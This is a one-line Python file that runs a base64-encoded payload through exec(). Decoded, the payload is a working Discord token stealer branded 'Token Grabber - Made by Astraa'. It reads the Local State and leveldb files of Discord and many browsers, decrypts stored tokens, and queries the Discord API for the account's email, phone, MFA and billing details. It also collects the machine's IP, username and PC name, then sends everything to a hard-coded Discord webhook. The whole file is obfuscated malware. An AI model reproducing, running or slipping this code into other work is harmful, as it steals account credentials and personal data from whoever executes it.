exec("""\nimport base64\nexec(compile(base64.b64decode("ZnJvbSBiYXNlNjQgaW1wb3J0IGI2NGRlY29kZQpmcm9tIENyeXB0by5DaXBoZXIgaW1wb3J0IEFFUwpmcm9tIHdpbjMyY3J5cHQgaW1wb3J0IENyeXB0VW5wcm90ZWN0RGF0YQpmcm9tIG9zIGltcG9ydCBnZXRsb2dpbiwgbGlzdGRpcgpmcm9tIGpzb24gaW1wb3J0IGxvYWRzCmZyb20gcmUgaW1wb3J0IGZpbmRhbGwKZnJvbSB1cmxsaWIucmVxdWVzdCBpbXBvcnQgUmVxdWVzdCwgdXJsb3Blbgpmcm9tIHN1YnByb2Nlc3MgaW1wb3J0IFBvcGVuLCBQSVBFCmltcG9ydCByZXF1ZXN0cywganNvbiwgb3MKZnJvbSBkYXRldGltZSBpbXBvcnQgZGF0ZXRpbWUKCnRva2VucyA9IFtdCmNsZWFuZWQgPSBbXQpjaGVja2VyID0gW10KCmRlZiBkZWNyeXB0KGJ1ZmYsIG1hc3Rlcl9rZXkpOgogICAgdHJ5OgogICAgICAgIHJldHVybiBBRVMubmV3KENyeXB0VW5wcm90ZWN0RGF0YShtYXN0ZXJfa2V5LCBOb25lLCBOb25lLCBOb25lLCAwKVsxXSwgQUVTLk1PREVfR0NNLCBidWZmWzM6MTVdKS5kZWNyeXB0KGJ1ZmZbMTU6XSlbOi0xNl0uZGVjb2RlKCkKICAgIGV4Y2VwdDoKICAgICAgICByZXR1cm4gIkVycm9yIgpkZWYgZ2V0aXAoKToKICAgIGlwID0gIk5vbmUiCiAgICB0cnk6CiAgICAgICAgaXAgPSB1cmxvcGVuKFJlcXVlc3QoImh0dHBzOi8vYXBpLmlwaWZ5Lm9yZyIpKS5yZWFkKCkuZGVjb2RlKCkuc3RyaXAoKQogICAgZXhjZXB0OiBwYXNzCiAgICByZXR1cm4gaXAKZGVmIGdldGh3aWQoKToKICAgIHAgPSBQb3Blbigid21pYyBjc3Byb2R1Y3QgZ2V0IHV1aWQiLCBzaGVsbD1UcnVlLCBzdGRpbj1QSVBFLCBzdGRvdXQ9UElQRSwgc3RkZXJyPVBJUEUpCiAgICByZXR1cm4gKHAuc3Rkb3V0LnJlYWQoKSArIHAuc3RkZXJyLnJlYWQoKSkuZGVjb2RlKCkuc3BsaXQoIlxuIilbMV0KZGVmIGdldF90b2tlbigpOgogICAgYWxyZWFkeV9jaGVjayA9IFtdCiAgICBjaGVja2VyID0gW10KICAgIGxvY2FsID0gb3MuZ2V0ZW52KCdMT0NBTEFQUERBVEEnKQogICAgcm9hbWluZyA9IG9zLmdldGVudignQVBQREFUQScpCiAgICBjaHJvbWUgPSBsb2NhbCArICJcXEdvb2dsZVxcQ2hyb21lXFxVc2VyIERhdGEiCiAgICBwYXRocyA9IHsKICAgICAgICAnRGlzY29yZCc6IHJvYW1pbmcgKyAnXFxkaXNjb3JkJywKICAgICAgICAnRGlzY29yZCBDYW5hcnknOiByb2FtaW5nICsgJ1xcZGlzY29yZGNhbmFyeScsCiAgICAgICAgJ0xpZ2h0Y29yZCc6IHJvYW1pbmcgKyAnXFxMaWdodGNvcmQnLAogICAgICAgICdEaXNjb3JkIFBUQic6IHJvYW1pbmcgKyAnXFxkaXNjb3JkcHRiJywKICAgICAgICAnT3BlcmEnOiByb2FtaW5nICsgJ1xcT3BlcmEgU29mdHdhcmVcXE9wZXJhIFN0YWJsZScsCiAgICAgICAgJ09wZXJhIEdYJzogcm9hbWluZyArICdcXE9wZXJhIFNvZnR3YXJlXFxPcGVyYSBHWCBTdGFibGUnLAogICAgICAgICdBbWlnbyc6IGxvY2FsICsgJ1xcQW1pZ29cXFVzZXIgRGF0YScsCiAgICAgICAgJ1RvcmNoJzogbG9jYWwgKyAnXFxUb3JjaFxcVXNlciBEYXRhJywKICAgICAgICAnS29tZXRhJzogbG9jYWwgKyAnXFxLb21ldGFcXFVzZXIgRGF0YScsCiAgICAgICAgJ09yYml0dW0nOiBsb2NhbCArICdcXE9yYml0dW1cXFVzZXIgRGF0YScsCiAgICAgICAgJ0NlbnRCcm93c2VyJzogbG9jYWwgKyAnXFxDZW50QnJvd3NlclxcVXNlciBEYXRhJywKICAgICAgICAnN1N0YXInOiBsb2NhbCArICdcXDdTdGFyXFw3U3RhclxcVXNlciBEYXRhJywKICAgICAgICAnU3B1dG5payc6IGxvY2FsICsgJ1xcU3B1dG5pa1xcU3B1dG5pa1xcVXNlciBEYXRhJywKICAgICAgICAnVml2YWxkaSc6IGxvY2FsICsgJ1xcVml2YWxkaVxcVXNlciBEYXRhXFxEZWZhdWx0JywKICAgICAgICAnQ2hyb21lIFN4Uyc6IGxvY2FsICsgJ1xcR29vZ2xlXFxDaHJvbWUgU3hTXFxVc2VyIERhdGEnLAogICAgICAgICdDaHJvbWUnOiBjaHJvbWUgKyAnRGVmYXVsdCcsCiAgICAgICAgJ0VwaWMgUHJpdmFjeSBCcm93c2VyJzogbG9jYWwgKyAnXFxFcGljIFByaXZhY3kgQnJvd3NlclxcVXNlciBEYXRhJywKICAgICAgICAnTWljcm9zb2Z0IEVkZ2UnOiBsb2NhbCArICdcXE1pY3Jvc29mdFxcRWRnZVxcVXNlciBEYXRhXFxEZWZhdWwnLAogICAgICAgICdVcmFuJzogbG9jYWwgKyAnXFx1Q296TWVkaWFcXFVyYW5cXFVzZXIgRGF0YVxcRGVmYXVsdCcsCiAgICAgICAgJ1lhbmRleCc6IGxvY2FsICsgJ1xcWWFuZGV4XFxZYW5kZXhCcm93c2VyXFxVc2VyIERhdGFcXERlZmF1bHQnLAogICAgICAgICdCcmF2ZSc6IGxvY2FsICsgJ1xcQnJhdmVTb2Z0d2FyZVxcQnJhdmUtQnJvd3NlclxcVXNlciBEYXRhXFxEZWZhdWx0JywKICAgICAgICAnSXJpZGl1bSc6IGxvY2FsICsgJ1xcSXJpZGl1bVxcVXNlciBEYXRhXFxEZWZhdWx0JwogICAgfQogICAgZm9yIHBsYXRmb3JtLCBwYXRoIGluIHBhdGhzLml0ZW1zKCk6CiAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGgpOiBjb250aW51ZQogICAgICAgIHRyeToKICAgICAgICAgICAgd2l0aCBvcGVuKHBhdGggKyBmIlxcTG9jYWwgU3RhdGUiLCAiciIpIGFzIGZpbGU6CiAgICAgICAgICAgICAgICBrZXkgPSBsb2FkcyhmaWxlLnJlYWQoKSlbJ29zX2NyeXB0J11bJ2VuY3J5cHRlZF9rZXknXQogICAgICAgICAgICAgICAgZmlsZS5jbG9zZSgpCiAgICAgICAgZXhjZXB0OiBjb250aW51ZQogICAgICAgIGZvciBmaWxlIGluIGxpc3RkaXIocGF0aCArIGYiXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwiKToKICAgICAgICAgICAgaWYgbm90IGZpbGUuZW5kc3dpdGgoIi5sZGIiKSBhbmQgZmlsZS5lbmRzd2l0aCgiLmxvZyIpOiBjb250aW51ZQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgIHdpdGggb3BlbihwYXRoICsgZiJcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXHtmaWxlfSIsICJyIiwgZXJyb3JzPSdpZ25vcmUnKSBhcyBmaWxlczoKICAgICAgICAgICAgICAgICAgICAgICAgZm9yIHggaW4gZmlsZXMucmVhZGxpbmVzKCk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB4LnN0cmlwKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciB2YWx1ZXMgaW4gZmluZGFsbChyImRRdzR3OVdnWGNROlteLipcWycoLiopJ1xdLiokXVteXCJdKiIsIHgpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRva2Vucy5hcHBlbmQodmFsdWVzKQogICAgICAgICAgICAgICAgZXhjZXB0IFBlcm1pc3Npb25FcnJvcjogY29udGludWUKICAgICAgICBmb3IgaSBpbiB0b2tlbnM6CiAgICAgICAgICAgIGlmIGkuZW5kc3dpdGgoIlxcIik6CiAgICAgICAgICAgICAgICBpLnJlcGxhY2UoIlxcIiwgIiIpCiAgICAgICAgICAgIGVsaWYgaSBub3QgaW4gY2xlYW5lZDoKICAgICAgICAgICAgICAgIGNsZWFuZWQuYXBwZW5kKGkpCiAgICAgICAgZm9yIHRva2VuIGluIGNsZWFuZWQ6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHRvayA9IGRlY3J5cHQoYjY0ZGVjb2RlKHRva2VuLnNwbGl0KCdkUXc0dzlXZ1hjUTonKVsxXSksIGI2NGRlY29kZShrZXkpWzU6XSkKICAgICAgICAgICAgZXhjZXB0IEluZGV4RXJyb3IgPT0gIkVycm9yIjogY29udGludWUKICAgICAgICAgICAgY2hlY2tlci5hcHBlbmQodG9rKQogICAgICAgICAgICBmb3IgdmFsdWUgaW4gY2hlY2tlcjoKICAgICAgICAgICAgICAgIGlmIHZhbHVlIG5vdCBpbiBhbHJlYWR5X2NoZWNrOgogICAgICAgICAgICAgICAgICAgIGFscmVhZHlfY2hlY2suYXBwZW5kKHZhbHVlKQogICAgICAgICAgICAgICAgICAgIGhlYWRlcnMgPSB7J0F1dGhvcml6YXRpb24nOiB0b2ssICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbid9CiAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICByZXMgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZGlzY29yZGFwcC5jb20vYXBpL3Y2L3VzZXJzL0BtZScsIGhlYWRlcnM9aGVhZGVycykKICAgICAgICAgICAgICAgICAgICBleGNlcHQ6IGNvbnRpbnVlCiAgICAgICAgICAgICAgICAgICAgaWYgcmVzLnN0YXR1c19jb2RlID09IDIwMDoKICAgICAgICAgICAgICAgICAgICAgICAgcmVzX2pzb24gPSByZXMuanNvbigpCiAgICAgICAgICAgICAgICAgICAgICAgIGlwID0gZ2V0aXAoKQogICAgICAgICAgICAgICAgICAgICAgICBwY191c2VybmFtZSA9IG9zLmdldGVudigiVXNlck5hbWUiKQogICAgICAgICAgICAgICAgICAgICAgICBwY19uYW1lID0gb3MuZ2V0ZW52KCJDT01QVVRFUk5BTUUiKQogICAgICAgICAgICAgICAgICAgICAgICB1c2VyX25hbWUgPSBmJ3tyZXNfanNvblsidXNlcm5hbWUiXX0je3Jlc19qc29uWyJkaXNjcmltaW5hdG9yIl19JwogICAgICAgICAgICAgICAgICAgICAgICB1c2VyX2lkID0gcmVzX2pzb25bJ2lkJ10KICAgICAgICAgICAgICAgICAgICAgICAgZW1haWwgPSByZXNfanNvblsnZW1haWwnXQogICAgICAgICAgICAgICAgICAgICAgICBwaG9uZSA9IHJlc19qc29uWydwaG9uZSddCiAgICAgICAgICAgICAgICAgICAgICAgIG1mYV9lbmFibGVkID0gcmVzX2pzb25bJ21mYV9lbmFibGVkJ10KICAgICAgICAgICAgICAgICAgICAgICAgaGFzX25pdHJvID0gRmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgcmVzID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2Rpc2NvcmRhcHAuY29tL2FwaS92Ni91c2Vycy9AbWUvYmlsbGluZy9zdWJzY3JpcHRpb25zJywgaGVhZGVycz1oZWFkZXJzKQogICAgICAgICAgICAgICAgICAgICAgICBuaXRyb19kYXRhID0gcmVzLmpzb24oKQogICAgICAgICAgICAgICAgICAgICAgICBoYXNfbml0cm8gPSBib29sKGxlbihuaXRyb19kYXRhKSA+IDApCiAgICAgICAgICAgICAgICAgICAgICAgIGRheXNfbGVmdCA9IDAKICAgICAgICAgICAgICAgICAgICAgICAgaWYgaGFzX25pdHJvOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZDEgPSBkYXRldGltZS5zdHJwdGltZShuaXRyb19kYXRhWzBdWyJjdXJyZW50X3BlcmlvZF9lbmQiXS5zcGxpdCgnLicpWzBdLCAiJVktJW0tJWRUJUg6JU06JVMiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZDIgPSBkYXRldGltZS5zdHJwdGltZShuaXRyb19kYXRhWzBdWyJjdXJyZW50X3BlcmlvZF9zdGFydCJdLnNwbGl0KCcuJylbMF0sICIlWS0lbS0lZFQlSDolTTolUyIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXlzX2xlZnQgPSBhYnMoKGQyIC0gZDEpLmRheXMpCiAgICAgICAgICAgICAgICAgICAgICAgIGVtYmVkID0gZiIiIioqe3VzZXJfbmFtZX0qKiAqKHt1c2VyX2lkfSkqXG4KPiA6ZGl2aWRlcnM6IF9fQWNjb3VudCBJbmZvcm1hdGlvbl9fXG5cdEVtYWlsOiBge2VtYWlsfWBcblx0UGhvbmU6IGB7cGhvbmV9YFxuXHQyRkEvTUZBIEVuYWJsZWQ6IGB7bWZhX2VuYWJsZWR9YFxuXHROaXRybzogYHtoYXNfbml0cm99YFxuXHRFeHBpcmVzIGluOiBge2RheXNfbGVmdCBpZiBkYXlzX2xlZnQgZWxzZSAiTm9uZSJ9IGRheShzKWBcbgo+IDpjb21wdXRlcjogX19QQyBJbmZvcm1hdGlvbl9fXG5cdElQOiBge2lwfWBcblx0VXNlcm5hbWU6IGB7cGNfdXNlcm5hbWV9YFxuXHRQQyBOYW1lOiBge3BjX25hbWV9YFxuXHRQbGF0Zm9ybTogYHtwbGF0Zm9ybX1gXG4KPiA6cGnDsWF0YTogX19Ub2tlbl9fXG5cdGB7dG9rfWBcbgoqTWFkZSBieSBBc3RyYWEjNjEwMCogKip8KiogfHxodHRwczovL2dpdGh1Yi5jb20vYXN0cmFhZGV2fHwiIiIKICAgICAgICAgICAgICAgICAgICAgICAgcGF5bG9hZCA9IGpzb24uZHVtcHMoeydjb250ZW50JzogZW1iZWQsICd1c2VybmFtZSc6ICdUb2tlbiBHcmFiYmVyIC0gTWFkZSBieSBBc3RyYWEnLCAnYXZhdGFyX3VybCc6ICdodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy84MjY1ODE2OTc0MzY1ODE5MTkvOTgyMzc0MjY0NjA0ODY0NTcyL2F0aW8uanBnJ30pCiAgICAgICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGhlYWRlcnMyID0gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbicsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ1VzZXItQWdlbnQnOiAnTW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0KSBBcHBsZVdlYktpdC81MzcuMTEgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMjMuMC4xMjcxLjY0IFNhZmFyaS81MzcuMTEnCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXEgPSBSZXF1ZXN0KCdodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMDU5MTQ0MTg5OTU2MzI5NTYyL0J4R1NtTkk1YmYtRmZwNElZQWF2dC1TOE12UzJyTnlFdWg0Y3J0M3Vza3E3V1h3Z044YnFxUEc4OFhoTUl0bVRmZTFYJywgZGF0YT1wYXlsb2FkLmVuY29kZSgpLCBoZWFkZXJzPWhlYWRlcnMyKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdXJsb3BlbihyZXEpCiAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdDogY29udGludWUKICAgICAgICAgICAgICAgIGVsc2U6IGNvbnRpbnVlCmlmIF9fbmFtZV9fID09ICdfX21haW5fXyc6CiAgICBnZXRfdG9rZW4oKQ=="),'<string>','exec'))\n""")